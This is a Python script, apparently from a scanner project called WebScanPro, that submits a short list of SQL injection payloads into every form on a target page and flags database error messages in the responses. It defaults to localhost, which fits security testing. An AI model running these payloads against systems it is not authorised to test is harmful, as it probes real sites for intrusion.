import requests
from bs4 import BeautifulSoup
import json

# SQL Payloads for testing
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='2",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--",
    "' OR 'a'='a",
]

HEADERS = {
    "User-Agent": "WebScanPro-SQLTester"
}

def test_sql_injection(url):
    results = {"url": url, "forms": [], "vulnerable": False}
    
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")

        forms = soup.find_all("form")
        print(f"\n[+] Testing forms on {url} (found {len(forms)})")

        for idx, form in enumerate(forms, start=1):
            form_details = {
                "form_number": idx,
                "action": form.get("action"),
                "method": form.get("method", "get").lower(),
                "inputs": [],
                "payloads_tested": [],
                "vulnerable": False
            }

            inputs = form.find_all("input")
            for inp in inputs:
                form_details["inputs"].append(inp.get("name"))

            for payload in PAYLOADS:
                print(f"    [*] Testing payload: {payload}")
                data = {inp.get("name"): payload for inp in inputs if inp.get("name")}
                target_url = url if not form.get("action") else url + "/" + form.get("action")

                try:
                    if form_details["method"] == "post":
                        r = requests.post(target_url, data=data, headers=HEADERS, timeout=10)
                    else:
                        r = requests.get(target_url, params=data, headers=HEADERS, timeout=10)
                    
                    content = r.text.lower()
                    form_details["payloads_tested"].append(payload)

                    # Check for common SQL error messages
                    if any(err in content for err in ["sql syntax", "mysql", "syntax error", "odbc", "ora-"]):
                        print(f"    [!!] Possible SQL Injection vulnerability detected with payload: {payload}")
                        form_details["vulnerable"] = True
                        results["vulnerable"] = True
                        break  # stop testing once vulnerable found
                except Exception as e:
                    print(f"    [-] Request failed with payload {payload}: {e}")

            results["forms"].append(form_details)

    except Exception as e:
        print(f"[-] Failed to fetch {url}: {e}")

    return results


if __name__ == "__main__":
    target_url = "http://localhost:8080"   # change when needed
    print("[+] Starting SQL Injection tests...")
    scan_result = test_sql_injection(target_url)

    # Save results
    with open("sql_injection_results.json", "w") as f:
        json.dump(scan_result, f, indent=4)

    print("\n[+] Scan completed. Results saved to sql_injection_results.json")